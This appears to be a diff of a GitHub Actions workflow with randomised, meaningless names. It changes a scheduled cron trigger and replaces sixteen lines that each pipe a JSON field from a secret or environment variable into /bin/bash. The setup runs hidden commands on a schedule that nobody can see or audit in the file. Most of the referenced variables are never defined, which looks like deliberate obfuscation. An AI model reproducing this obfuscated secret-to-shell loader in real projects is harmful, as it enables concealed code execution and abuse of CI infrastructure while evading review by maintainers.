@@ -3,30 +3,29 @@ name: gaojiaoshi4389
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 3/6 * * *'
+    - cron: '13 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gaojiaoshi4389
         env:
-          qyn45024: ${{ secrets.qyn45024 }}
+          ex156: ${{ secrets.ex156 }}
         run: |
-          echo $qyn45024 | jq -r .ml82325 | /bin/bash
-          echo $ptntt10 | jq -r .mfko28829 | /bin/bash
-          echo $qyb133 | jq -r .nx8 | /bin/bash
-          echo $j9959 | jq -r .utk2181 | /bin/bash
-          echo $rvkl0 | jq -r .ch0 | /bin/bash
-          echo $v8046 | jq -r .c7 | /bin/bash
-          echo $igsn6 | jq -r .y39 | /bin/bash
-          echo $vhw41657 | jq -r .t18018 | /bin/bash
-          echo $zrqfz8087 | jq -r .eshmi701 | /bin/bash
-          echo $yhs0658 | jq -r .iesez7 | /bin/bash
-          echo $je0 | jq -r .sj0449 | /bin/bash
-          echo $cccg334 | jq -r .fycs05114 | /bin/bash
-          echo $rkqpl36194 | jq -r .is77679 | /bin/bash
-          echo $ejzy79 | jq -r .sho2 | /bin/bash
-          echo $mhlp333 | jq -r .c4901 | /bin/bash
-          echo $o1885 | jq -r .xbob6 | /bin/bash
+          echo $ex156 | jq -r .nfrq2034 | /bin/bash
+          echo $a0244 | jq -r .vtqrm39358 | /bin/bash
+          echo $dlg368 | jq -r .k45980 | /bin/bash
+          echo $cq33 | jq -r .rvhm618 | /bin/bash
+          echo $hbcdg142 | jq -r .ivgs6 | /bin/bash
+          echo $azgvh4526 | jq -r .ukfe500 | /bin/bash
+          echo $wshjp4 | jq -r .zat39292 | /bin/bash
+          echo $chavz97 | jq -r .opg9459 | /bin/bash
+          echo $z715 | jq -r .qwmu0 | /bin/bash
+          echo $lrzwd2473 | jq -r .sasf34769 | /bin/bash
+          echo $floa8536 | jq -r .sxe21 | /bin/bash
+          echo $n77 | jq -r .vzc403 | /bin/bash
+          echo $lkr1 | jq -r .w385 | /bin/bash
+          echo $fef22370 | jq -r .lwx7 | /bin/bash
 
